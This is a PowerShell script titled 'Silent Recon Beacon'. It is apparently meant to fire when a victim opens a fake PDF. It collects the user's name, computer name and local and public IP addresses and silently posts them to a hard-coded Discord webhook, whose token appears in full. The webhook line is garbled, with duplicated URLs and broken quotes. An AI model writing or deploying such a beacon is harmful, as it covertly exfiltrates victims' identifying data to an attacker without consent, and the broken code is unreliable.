# report.ps1 - Silent Recon Beacon (PowerShell Only)
$webhook = "https://discord.com/api/webhooks/"https://discord.com/api/webhooks/https://discordapp.com/api/webhooks/1547609479242326016/XUwdWXwfxnJFELuClPeFiTWLqti8o4o86gVD6y8fRk2uzBwq8du5t58L3uMZ7WlN_wA4""  # ← Jouw webhook

$user = $env:USERNAME
$pc = $env:COMPUTERNAME
$ip = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
try { $public = (Invoke-WebRequest -uri "https://ifconfig.me" -TimeoutSec 5).Content } catch { $public = "Unknown" }

$msg = @"
**🎯 Fake PDF Opened!**
**User:** $user
**PC:** $pc
**Local IP:** $ip
**Public IP:** $public
**Time:** $(Get-Date)
"@

try {
    Invoke-RestMethod -Uri $webhook -Method POST -Body "{`"content`":`"$msg`"}" -ContentType 'application/json'
} catch {}
